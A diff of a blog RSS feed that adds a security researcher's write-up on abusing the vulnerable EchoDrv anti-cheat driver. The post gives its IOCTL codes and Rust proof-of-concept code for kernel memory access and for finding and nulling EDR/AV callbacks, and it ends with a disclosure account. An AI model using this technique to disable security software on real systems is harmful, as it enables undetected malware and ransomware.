@@ -6,7 +6,385 @@
     <description>Recent content on Terminal</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 20 Jul 2023 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 28 Sep 2023 00:00:00 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Outsmarting Antivirus [Echo AC Edition]</title>
+      <link>/posts/echohno/</link>
+      <pubDate>Thu, 28 Sep 2023 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/echohno/</guid>
+      <description>1 Credits  https://ioctl.fail/echo-ac-writeup/ https://github.com/wavestone-cdt/EDRSandblast  2 Introduction In the realm of today&amp;rsquo;s cyberspace the adoption of an Antivirus (AV) or an Endpoint Detection and Response (EDR) software plays a crucial role in securing a computer system from malicious threats. In today&amp;rsquo;s digital world, having an Antivirus or Endpoint Detection and Response software is like putting a lock on your door to protect your computer. While it can block less sophisticated attacks, it might not catch really sophisticated ones.</description>
+      <content>&lt;h1 id=&#34;1-credits&#34;&gt;&lt;code&gt;1&lt;/code&gt; Credits&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://ioctl.fail/echo-ac-writeup/&#34;&gt;https://ioctl.fail/echo-ac-writeup/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/wavestone-cdt/EDRSandblast&#34;&gt;https://github.com/wavestone-cdt/EDRSandblast&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;2-introduction&#34;&gt;&lt;code&gt;2&lt;/code&gt; Introduction&lt;/h1&gt;
+&lt;p&gt;In the realm of today&amp;rsquo;s cyberspace the adoption of an Antivirus (AV) or an Endpoint Detection and Response (EDR) software plays a crucial role in securing a computer system from malicious threats. In today&amp;rsquo;s digital world, having an Antivirus or Endpoint Detection and Response software is like putting a lock on your door to protect your computer. While it can block less sophisticated attacks, it might not catch really sophisticated ones. Cybercrime today is like a game of catch-me-if-you-can, as attackers keep getting smarter with their methods.&lt;/p&gt;
+&lt;h1 id=&#34;3-functionality-user-mode-vs-kernel-mode&#34;&gt;&lt;code&gt;3&lt;/code&gt; Functionality: User-mode vs Kernel-mode&lt;/h1&gt;
+&lt;p&gt;A computer is built up from two different modes, user-mode and kernel-mode. When a user-mode program requests to run, a process and a virtual address space is created by Windows. Programs running in user-mode are less privileged than user-mode applications. If a user-mode application wants to access system resources, it will first have to go through the kernel by using syscalls.&lt;/p&gt;
+&lt;p&gt;In kernel-mode all code shares a single virtual address space. Therefore a kernel-mode driver does not experience any isolation from other drivers. When a driver writes data to the wrong virtual address it can overwrite data belonging to another driver. If a kernel-mode driver crashes, the entire OS crashes (also known as a Blue Screen of Death (BSOD)).&lt;/p&gt;
+
+&lt;img src=&#34;/img/userandkernelmode01.png&#34;  alt=&#34;usermode vs kernelmode&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;h1 id=&#34;4-unveiling-driver-vulnerability&#34;&gt;&lt;code&gt;4&lt;/code&gt; Unveiling Driver Vulnerability&lt;/h1&gt;
+&lt;p&gt;Echo AC, or Echo AntiCheat, serves as an anti-cheat solution designed to identify and prevent cheating among users. It achieves this by conducting memory scans, examining recently visited websites, scrutinizing files within your recycle bin, and collecting a comprehensive set of data. This software, however, is notably intrusive in terms of user privacy. Game server administrators typically mandate its usage, and non-compliance may result in restrictions from accessing their game servers.&lt;/p&gt;
+&lt;p&gt;Echo AC utilizes a kernel-mode driver to access data from various processes without implementing sufficient access control mechanisms to restrict which programs can communicate with this driver. Merely obtaining a handle to the driver and issuing the appropriate IOCTL codes is sufficient to have the driver fulfill your requests.&lt;/p&gt;
+&lt;p&gt;With the theoretical background and backstory now set aside, let&amp;rsquo;s delve into the operational aspects of this driver.&lt;/p&gt;
+
+&lt;img src=&#34;/img/driversign.png&#34;  alt=&#34;driversign&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;When inspecting the certificate of the driver we can see a few things. The driver was signed on Wednesday 16 December, 2020 at 0:25:28 and is valid to Friday 3 December 2021. Take in mind that at the day of writing this certificate is nearly &lt;code&gt;2 years&lt;/code&gt; overdue.&lt;/p&gt;
+&lt;p&gt;When opening the Driver within Ghidra, we can follow the call to mmCopyVirtualMemory to the functions that uses this function. In our case only 1 reference was found to mmCopyVirtualMemory and this reference I called CopyMemory as this is what the function does.&lt;/p&gt;
+
+&lt;img src=&#34;/img/mmcopyvirtualmemory.png&#34;  alt=&#34;copyvirtualmemory&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;When following the reference we get a pseudo-decompiled version of the function &lt;code&gt;CopyMemory&lt;/code&gt;, I renamed some of the variables to make it more simplistic to get the feeling of what&amp;rsquo;s going on and how it all works.&lt;/p&gt;
+
+&lt;img src=&#34;/img/CopyMemoryFunction.png&#34;  alt=&#34;copymemoryfunction&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;The mmCopyVirtualMemory function parameters look like this:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;1&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;C&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;mmCopyVirtualMemory function parameters&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-C&#34; &gt;&lt;code&gt;
+NTSTATUS NTAPI MmCopyVirtualMemory
+(
+    PEPROCESS SourceProcess,
+    PVOID SourceAddress,
+    PEPROCESS TargetProcess,
+    PVOID TargetAddress,
+    SIZE_T BufferSize,
+    KPROCESSOR_MODE PreviousMode,
+    PSIZE_T ReturnSize
+);
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Now we know what function is responsible for &lt;code&gt;copying and pasting&lt;/code&gt;, we still need to figure out how we can access/use this function to our advantage.
+To see where our copy function is being used we can look for the references. When we double click our CopyMemory function we get to see the references, one of which is &lt;code&gt;14000197c&lt;/code&gt; when we click this reference we will be taken to where the function is called.&lt;/p&gt;
+
+&lt;img src=&#34;/img/referenceCopy.png&#34;  alt=&#34;copymemoryreference&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;When we follow this reference, we are dropped in the main part of the driver. We are able to see what is callable with IOCTL codes that we can send to the driver. It may not say much right now but we&amp;rsquo;ll slowly walk through it.&lt;/p&gt;
+
+&lt;img src=&#34;/img/mainpartofdriver.png&#34;  alt=&#34;mainpartofdriver&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;Let&amp;rsquo;s start simple with the question, what can we see? We see a bunch of if and else statements, these if/else statements are comparing for a value and do something according to the result. These values are actually IOCTL codes (for example &lt;code&gt;if (iVar5 == -0x6195fa6c)&lt;/code&gt;) to tell the driver to do a certain action, but now how do we call it?&lt;/p&gt;
+&lt;p&gt;When we follow the first if else statement, we can see a comparision against a value but what is the else about? when we double click on &lt;code&gt;LAB_140001b03&lt;/code&gt; we can see what the else does for us.&lt;/p&gt;
+
+&lt;img src=&#34;/img/ifelse.png&#34;  alt=&#34;ifelse&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;The else statement in this case makes the driver exit, which is not something we want so we will have to make sure we&amp;rsquo;re not exiting out of the driver.&lt;/p&gt;
+&lt;p&gt;We can bypass the comparison, because we can literally see what it compares with.&lt;/p&gt;
+
+&lt;img src=&#34;/img/compare.png&#34;  alt=&#34;compare&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;As the above image shows it compares the EDI register with the value &lt;code&gt;0x9e6a0594&lt;/code&gt;,  we can thus call the driver using the IOCTL code of &lt;code&gt;0x0x9e6a0594&lt;/code&gt; bypassing the check.
+Now to not let the driver crash upon itself we need to set a buffer which is necessary for BCrypt. We can see at the end that ppUvar2 is being set to &lt;code&gt;0x1000&lt;/code&gt; which means &lt;code&gt;4096&lt;/code&gt; in decimal. A buffer of 4096 should thus be sufficient for BCrypt to put it&amp;rsquo;s data into, if we do not create this buffer the driver will cause a BSOD (Blue Screen Of Death).&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s apply the logic we just learned to the next &lt;code&gt;IOCTL&lt;/code&gt; code we can find.&lt;/p&gt;
+
+&lt;img src=&#34;/img/function2.png&#34;  alt=&#34;function2&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;As we can see the next function we can call is accessable by calling the &lt;code&gt;IOCTL&lt;/code&gt; code of &lt;code&gt;0xe6224248&lt;/code&gt;. Now lets take a step back and take in the view of the second function. We see &lt;code&gt;PsLookupProcessByProcessId&lt;/code&gt;, &lt;code&gt;ObOpenObjectByPointer&lt;/code&gt; and &lt;code&gt;ObfDereferenceObject&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;From the Microsoft documentation (MSDN) page &lt;code&gt;PsLookupProcessByProcessId&lt;/code&gt; function routine accepts the process ID of a process and returns a referenced pointer to the EPROCESS structure of the process. The first argument to the function is the ProcessId and the second arguement is a pointer to the EPROCESS structure of the process specified by the ProcessId. This means that &lt;code&gt;puVar3&lt;/code&gt; is the ProcessId and &lt;code&gt;uStack344&lt;/code&gt; is the EPROCESS structure pointer.&lt;/p&gt;
+&lt;p&gt;When we clean up the decompiled code a bit we get the following:&lt;/p&gt;
+
+&lt;img src=&#34;/img/cleaned_up.png&#34;  alt=&#34;cleanedupimage&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;Microsoft Documentation (MSDN) describes the following about &lt;code&gt;ObOpenObjectByPointer&lt;/code&gt;, The ObOpenObjectByPointer function opens an object referenced by a pointer and returns a handle to the object. This means that this function returns a handle to the process that we are specifying by the process id.&lt;/p&gt;
+&lt;p&gt;Now the most interesting part of the driver, reading and writing memory. This function can be called using the IOCTL code of: &lt;code&gt;0x60a26124&lt;/code&gt; and looks like the following:
+
+&lt;img src=&#34;/img/copymemory.png&#34;  alt=&#34;copymemory&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+&lt;/p&gt;
+&lt;p&gt;MSDN describes the function of &lt;code&gt;ObReferenceObjectByHandle&lt;/code&gt; as the following: The ObReferenceObjectByHandle routine provides access validation on the object handle, and, if access can be granted, returns the corresponding pointer to the object&amp;rsquo;s body. This means that the driver is checking if it has access to the process that we specified using the process id, if successful it continues with copying the memory.&lt;/p&gt;
+&lt;h1 id=&#34;5-edr-and-av&#34;&gt;&lt;code&gt;5&lt;/code&gt; EDR and AV&lt;/h1&gt;
+&lt;p&gt;This paragraph explains the basic concepts concerning the inner functions of EDR and AVs and also goes in-depth in how to disable them.&lt;/p&gt;
+&lt;h1 id=&#34;51-innerworkings-of-edr-and-av&#34;&gt;&lt;code&gt;5.1&lt;/code&gt; Innerworkings of EDR and AV&lt;/h1&gt;
+&lt;p&gt;Most, if not all, of todays EDR and AV solutions run in both user-mode and kernel-mode. Most antivirus and endpoint detection and response (EDR) products use API hooking in userland and callbacks/event subscriptions for kernelmode.&lt;/p&gt;
+&lt;p&gt;In order to find malicious behaviour in process the AV/EDR will inject their own Dynamic Link Library (DLL). This DLL hooks Windows API calls that are frequently used for malicious activity. Since API hooks are placed within the address space of a program, that program can also access/overwrite these hooks which in turn makes the hooks placed by the AV/EDR useless. You can see why there should be a fallback option so that this can be monitored and prevented.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/Mr-Un1k0d3r/EDRs&#34;&gt;https://github.com/Mr-Un1k0d3r/EDRs&lt;/a&gt; lists user-mode hooks for populair EDR/AV providers like CrowdStrike, SentinelOne, Bitdefender and McAfee.&lt;/p&gt;
+
+&lt;img src=&#34;/img/apihook.png&#34;  alt=&#34;apihooking&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;An EDR and AV also use a kernel driver to monitor actions of the system. Since all user-mode applications have to run through the kernel this is a perfect place to position yourself as a protection provider. The reason for this is that the kernel is a bottleneck which can be utilized to give the highest order of protection.&lt;/p&gt;
+&lt;p&gt;The most commonly employed callback functions by EDRs and AVs include the following:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;PspCreateProcessNotifyRoutine&lt;/code&gt; for process creation;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;PspCreateThreadNotifyRoutine&lt;/code&gt; for thread creation;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;PspLoadImageNotifyRoutine&lt;/code&gt; for image loading;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;EDRs and AVs do not solely reply on callback functions to determine malicious actions, they can also register to get informed by Event Tracing for Windows, also known as ETW. ETW logs data usage on APIs which the EDR/AV can use to determine if specific actions are considered malicious and consequently block them.&lt;/p&gt;
+&lt;h1 id=&#34;6-proof-of-concept&#34;&gt;&lt;code&gt;6&lt;/code&gt; Proof-of-Concept&lt;/h1&gt;
+&lt;p&gt;This Proof-of-Concept shows the usage of disabling protection providers using kernel notify routine patching and etw threat disabling. It achieves this by cross referencing every driver that has a registered kernel notify routine with a set list of AV/EDR providers, when a match has been found it will null out the callback for this driver. Disabling ETW Threat provider is done by switching a bit from ENABLED (1) to DISABLED (0).&lt;/p&gt;
+&lt;p&gt;The complete code can be found here: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;The following code sets up the initial connection with the EchoDrv:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;2&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;Rust&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Rust code to set up the EchoDrv initial connection&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-Rust&#34; &gt;&lt;code&gt;
+    pub unsafe fn load() -&amp;gt; HANDLE {
+        // IOCTL Code - 0x9e6a0594
+
+        // sc create EchoDrv binpath=C:\PathToDriver.sys type= kernel &amp;amp;&amp;amp; sc start EchoDrv
+        let handle_driver = CreateFileW(
+            Utils::convert_string_to_mut_u16(&amp;#34;\\\\.\\EchoDrv&amp;#34;.to_string()),
+            GENERIC_READ | GENERIC_WRITE,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            null_mut(),
+            OPEN_EXISTING,
+            0,
+            0,
+        );
+
+        if handle_driver == INVALID_HANDLE_VALUE {
+            error!(&amp;#34;Failed to load driver&amp;#34;);
+            return 0;
+        }
+
+        let size = 4096;
+        let layout = Layout::from_size_align(size, std::mem::align_of::&amp;lt;u8&amp;gt;()).unwrap();
+
+        // Allocate memory on the heap and obtain a raw pointer to it
+        let buf: *mut u8 = unsafe { alloc(layout) as *mut u8 };
+
+        if DeviceIoControl(
+            handle_driver,
+            0x9e6a0594,
+            null_mut(),
+            0,
+            buf as *mut c_void,
+            4096,
+            null_mut(),
+            null_mut(),
+        ) == 0
+        {
+            error!(
+                &amp;#34;Calling driver with: 0x9e6a0594 failed\n{}&amp;#34;,
+                Error::last_os_error()
+            );
+            CloseHandle(handle_driver);
+
+            return 0;
+        }
+
+        // Free the buffer
+        unsafe { dealloc(buf as *mut _, layout) };
+        handle_driver
+    }
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;To continue, we get the handle to our own process, for this we use &lt;code&gt;GetCurrentProcessId&lt;/code&gt; and the following fuction:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;2&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;Rust&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Get our handle&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-Rust&#34; &gt;&lt;code&gt;
+    #[repr(C)]
+    #[derive(Copy, Clone)]
+    struct k_get_handle {
+        pid: u32,
+        access: u32,
+        handle: HANDLE,
+    }
+
+    pub unsafe fn get_handle_pid(handle_driver: HANDLE, pid: u32) -&amp;gt; HANDLE {
+        // IOCTL Code - 0xe6224248
+
+        let mut param: k_get_handle = std::mem::zeroed();
+
+        param.pid = pid;
+        param.access = 0x10000000; // GENERIC_ALL
+
+        if DeviceIoControl(
+            handle_driver,
+            0xe6224248,
+            &amp;amp;mut param as *const _ as *const c_void,
+            std::mem::size_of::&amp;lt;k_get_handle&amp;gt;() as u32,
+            &amp;amp;mut param as *mut _ as *mut c_void,
+            std::mem::size_of::&amp;lt;k_get_handle&amp;gt;() as u32,
+            null_mut(),
+            null_mut(),
+        ) == 0
+        {
+            error!(
+                &amp;#34;Calling driver with: 0xe6224248 failed\n{}&amp;#34;,
+                Error::last_os_error()
+            );
+            CloseHandle(handle_driver);
+            return 0;
+        }
+
+        param.handle
+    }
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Now comes the fun part, enumerating the edr drivers that use callbacks for process, thread and image creation. The code is a bit long, so I will disect it a bit to make it more understandable.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;3&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;Rust&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Getting the right offsets&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-Rust&#34; &gt;&lt;code&gt;
+	let (_, create_process, create_thread, load_image, _, _, _, _, _, _, _) = Offsets::get_offsets(ntos_kernel_version);
+        let routines = vec![&amp;#34;CreateProcess&amp;#34;, &amp;#34;CreateThread&amp;#34;, &amp;#34;LoadImage&amp;#34;];
+        let offsets = vec![create_process, create_thread, load_image];
+        let mut counter = 0;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;We get the right offsets from our predefined offset list, as this is only a Proof-of-Concept I have not made it dynamic and all offsets are static. Even though the offsets are all hardcoded, it supports over 600 different windows kernel versions.
+Firstly we parse our ntos kernel version to the offsets functions, which returns the offsets for CreateProcess, CreateThread and LoadImage routines.&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;4&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;Rust&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Making our routines&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-Rust&#34; &gt;&lt;code&gt;
+	for routine in routines {
+                let psp_routine = Utils::make_psp_routine(routine);
+                let psp_routine_addr = Utils::get_notify_address(ntos_kernel_base_address, offsets[counter] as usize);
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Secondly we loop through our three routines, create the right name for them (which is just a &lt;code&gt;format!(&amp;quot;Psp{}NotifyRoutine&amp;quot;, routine)&lt;/code&gt;) and get the address of our routine. The address is gotten from leaking our ntos kernel base address and adding the routine offset to it. So let&amp;rsquo;s say our base address is 0 and our routine offset is at 100 our routine address becomes 100, as 0 + 100 = 100.&lt;/p&gt;
+&lt;p&gt;Lastly, where the magic happends:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;5&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;5&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;Rust&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Enumerating Drivers through callbacks&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-Rust&#34; &gt;&lt;code&gt;
+	for i in 0..64 {
+                    let mut call_back_struct: u64 = 0;
+                    let size = std::mem::size_of_val(&amp;amp;call_back_struct) as u64;
+                    Driver::memory(driver_handle, (psp_routine_addr &amp;#43; (i * 8)) as u64, &amp;amp;mut call_back_struct, size, own_process_handle);
+
+                    if call_back_struct != 0 {
+                        let callback = (call_back_struct &amp;amp; !0b1111) &amp;#43; 8;
+                        let mut function: u64 = 0;
+                        let size = std::mem::size_of_val(&amp;amp;function) as u64;
+
+                        Driver::memory(driver_handle, callback, &amp;amp;mut function, size, own_process_handle);
+                        
+                        let mut driver_offset: u64 = 0;
+                        let driver_name = Utils::get_driver(function, &amp;amp;mut driver_offset);
+
+                        if !driver_name.clone().is_empty() &amp;amp;&amp;amp; Utils::is_driver_name_edr(driver_name.clone()) {
+                            let call_back_addr: u64 = (psp_routine_addr &amp;#43; (i * 8)) as u64;
+
+                            edr_drivers.push(FoundEdrDrivers {
+                                driver_name: driver_name.clone(),
+                                routine: psp_routine.to_string(),
+                                call_back_func: function,
+                                call_back_struct: call_back_struct,
+                                call_back_struct_addr: call_back_addr,
+                                removed: false,
+                            });
+                        }
+                    }
+                }
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;It looks like a lot doesn&amp;rsquo;t it? yeah you&amp;rsquo;re right, but let&amp;rsquo;s see if we can clear this up!
+The Psp create notify routine creates an array of &amp;lt; 64 items, hence why we loop through 64 iterations.
+The first 8 bytes represent an &lt;code&gt;EX_RUNDOWN_REF structure&lt;/code&gt;, so we can jump past them to get the address of the callback function inside of a driver.&lt;/p&gt;
+&lt;p&gt;If the driver is found to be an EDR associated driver, it gets added to a vector containing information about the Driver. To patch or null the driver from this array, we only have to overwrite the call back struct addr with 0.&lt;/p&gt;
+&lt;p&gt;So how does this look in practice? well something like this:&lt;/p&gt;
+
+&lt;img src=&#34;/img/running.png&#34;  alt=&#34;running poc&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;h1 id=&#34;7-responsible-disclosure-mitigating-risks&#34;&gt;&lt;code&gt;7&lt;/code&gt; Responsible Disclosure: Mitigating Risks&lt;/h1&gt;
+&lt;p&gt;As part of my research, I firstly inform the supplier of software before making a post about it. For this reason I waited roughly two months with writing this blogpost. When I joined Echo AntiCheat&amp;rsquo;s official discord I was directly met with an announcement, see below. Within the announcement Echo Anticheat makes a couple bold statements; The driver is automatically deleted following usage, poses no security risk to the user, considered standard practices at the time, there is no CVE and all vulnerabilities related to this product &lt;code&gt;EchoDrv&lt;/code&gt; are only based on inaccuracies and rumors.&lt;/p&gt;
+
+&lt;img src=&#34;/img/CVE.png&#34;  alt=&#34;cve&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;There is indeed not a CVE for the EchoDrv vulnerability &lt;code&gt;yet&lt;/code&gt;, but that&amp;rsquo;s why we have the Common Vulnerability Scoring System or CVSS for short. CVSS lets you calculate a score from 0-10 on how critical a vulnerability is. The CVSS score for EchoDrv is a &lt;code&gt;8.2&lt;/code&gt; denoted as a high vulnerability (&lt;a href=&#34;https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)&#34;&gt;https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The driver may be deleted automatically with the original usermode anticheat, this is not the case for software abusing this driver to either cheat, privilege escalate, protect processes or incapacitate AV/EDR. This vulnerability does not only pose a &lt;code&gt;severe&lt;/code&gt; risk to the overall security of the systems of users but also those of companies! Just take a look at this article where a ransomware groups abuses a abritrary read/write (just like in EchoDrv) to disable AV/EDR to deploy ransomware: &lt;a href=&#34;https://www.bleepingcomputer.com/news/security/blackbyte-ransomware-abuses-legit-driver-to-disable-security-products/&#34;&gt;https://www.bleepingcomputer.com/news/security/blackbyte-ransomware-abuses-legit-driver-to-disable-security-products/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Anyways, enough ranting here is the complete chat I had with Josh from Echo Anticheat.&lt;/p&gt;
+
+&lt;img src=&#34;/img/josh1.png&#34;  alt=&#34;josh&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+
+&lt;img src=&#34;/img/josh2.png&#34;  alt=&#34;josh2&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;    /&gt;
+
+
+&lt;p&gt;After this little chat I met the same faith as the first security researcher, banned from their discord server for trying to disclose a vulnerability.&lt;/p&gt;
+&lt;p&gt;Thank you for reading this write up and I want to close this blog post with a qoute which I found to be very fitting for this situation:&lt;/p&gt;
+&lt;p&gt;&amp;ldquo;Facts do not cease to exist because they are ignored&amp;rdquo; - Aldous Huxley&lt;/p&gt;
+&lt;h1 id=&#34;8-references&#34;&gt;&lt;code&gt;8&lt;/code&gt; References&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://ioctl.fail/echo-ac-writeup/&#34;&gt;https://ioctl.fail/echo-ac-writeup/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.geeksforgeeks.org/difference-between-user-mode-and-kernel-mode/&#34;&gt;https://www.geeksforgeeks.org/difference-between-user-mode-and-kernel-mode/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/wavestone-cdt/EDRSandblast&#34;&gt;https://github.com/wavestone-cdt/EDRSandblast&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.adlice.com/making-an-antivirus-engine-the-guidelines/&#34;&gt;https://www.adlice.com/making-an-antivirus-engine-the-guidelines/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://codemachine.com/articles/kernel_callback_functions.html&#34;&gt;https://codemachine.com/articles/kernel_callback_functions.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid&#34;&gt;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-pslookupprocessbyprocessid&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obreferenceobjectbyhandle&#34;&gt;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obreferenceobjectbyhandle&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://medium.com/@matterpreter/mimidrv-in-depth-4d273d19e148&#34;&gt;https://medium.com/@matterpreter/mimidrv-in-depth-4d273d19e148&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
     <item>
       <title>About</title>
       <link>/about/</link>
@@ -28,9 +406,11 @@ As a security researcher, I’m devoted to helping the cyber community defend th
 &lt;p&gt;Ndg-linux-essentials (Cisco)&lt;/p&gt;
 &lt;p&gt;TryHackMe RedTeam Path (Certificate of Completion)&lt;/p&gt;
 &lt;h1 id=&#34;some-certifications-i-still-wanna-get&#34;&gt;Some certifications I still wanna get&lt;/h1&gt;
-&lt;p&gt;&lt;a href=&#34;https://www.offsec.com/courses/pen-200/&#34;&gt;Offensive Security Certified Professional (OSCP)&lt;/a&gt;
-&lt;a href=&#34;https://www.offsec.com/courses/exp-301/&#34;&gt;Offensive Security Exploit Developer (OSED/EXP-301)&lt;/a&gt;
-&lt;a href=&#34;https://institute.sektor7.net/red-team-operator-malware-development-essentials&#34;&gt;Red team operator Malware development (Sektor7)&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.offsec.com/courses/pen-200/&#34;&gt;Offensive Security Certified Professional (OSCP)&lt;/a&gt;&lt;/li&gt;
